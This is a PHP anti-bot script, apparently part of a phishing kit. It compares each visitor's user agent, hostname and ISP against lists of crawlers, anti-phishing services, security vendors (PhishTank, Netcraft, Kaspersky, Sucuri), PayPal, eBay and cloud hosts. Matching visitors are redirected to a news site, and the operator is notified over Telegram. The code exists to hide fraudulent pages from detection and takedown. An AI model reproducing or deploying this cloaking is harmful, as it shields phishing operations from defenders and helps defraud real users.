<?php
// Anti9: Additional Bot Detection (from anti2 system)
// Enhanced bot detection with IP patterns and hostname checking

// No bypass system - full protection active

$client_ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$hostname = gethostbyaddr($client_ip);

// Extensive bot detection patterns
$bot_agents = array(
    'googlebot', 'yahoo', 'slurp', 'yahooSeeker', 'facebookexternalhit', 
    'ia_archiver', 'yandexbot', 'baiduspider', 'crawler', 'httrack', 
    'pycurl', 'python-requests', 'curl', 'wget', 'phish', 'Http Crawler',
    'bot', 'spider', 'crawl', 'slurp', 'seek', 'accoona', 'acoon',
    'adressendeutschland', 'ah-ha.com', 'ahoy', 'altavista', 'ananzi',
    'anthill', 'appie', 'arachnophilia', 'arale', 'araneo', 'aranha',
    'architext', 'aretha', 'arks', 'asterias', 'atlocal', 'atn', 'atomz'
);

// Blocked words in hostname
$blocked_words = array(
    "bot", "above", "google", "softlayer", "amazonaws", "cyveillance", 
    "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", 
    "apache-httpclient", "msnbot", "p3pwgdsn", "netcraft", "trendmicro", 
    "ebay", "paypal", "torservers", "messagelabs", "sucuri.net", "crawler"
);

// Suspicious ISPs
$shit_isps = array(
    "DigitalOcean", "Amazon", "Google", "phishtank", "net4sec", 
    "AVAST Software s.r.o.", "BullGuard ApS", "PayPal", "Hotmail", 
    "Yahoo", "AOL", "Microsoft", "Kaspersky Lab", "Linode, LLC", 
    "MSN", "ONLINE S.A.S.", "Joshua Peter McQuistan"
);

// Check bot user agents
foreach($bot_agents as $bot_agent) {
    if (stripos($user_agent, $bot_agent) !== false) {
        require_once __DIR__ . '/telegram_notify.php';
        notifyBotBlocked($client_ip, $user_agent, "Bot user agent detected: {$bot_agent}");
        
        error_log("Bot detected (UA): {$bot_agent} from IP: {$client_ip}");
        header('HTTP/1.1 403 Forbidden');
        header('Location: https://www.mediapart.fr/');
        exit();
    }
}

// Check blocked words in hostname
foreach($blocked_words as $word) {
    if (stripos($hostname, $word) !== false) {
        require_once __DIR__ . '/telegram_notify.php';
        notifyBotBlocked($client_ip, $user_agent, "Blocked hostname detected: {$word}", ['hostname' => $hostname]);
        
        error_log("Blocked hostname: {$word} in {$hostname} from IP: {$client_ip}");
        header('HTTP/1.1 403 Forbidden');
        header('Location: https://www.mediapart.fr/');
        exit();
    }
}

// Check ISP information
$ipp = !empty($client_ip) ? $client_ip : "1.1.1.1";
$ISP = @file_get_contents('http://ipinfo.io/'.$ipp.'/org');

if ($ISP !== false) {
    foreach($shit_isps as $isp) {
        if (stripos($ISP, $isp) !== false) {
            require_once __DIR__ . '/telegram_notify.php';
            notifyBotBlocked($client_ip, $user_agent, "Suspicious ISP detected: {$isp}", ['isp' => $ISP]);
            
            error_log("Suspicious ISP: {$isp} from IP: {$client_ip}");
            header('HTTP/1.1 403 Forbidden');
            header('Location: https://www.mediapart.fr/');
            exit();
        }
    }
}
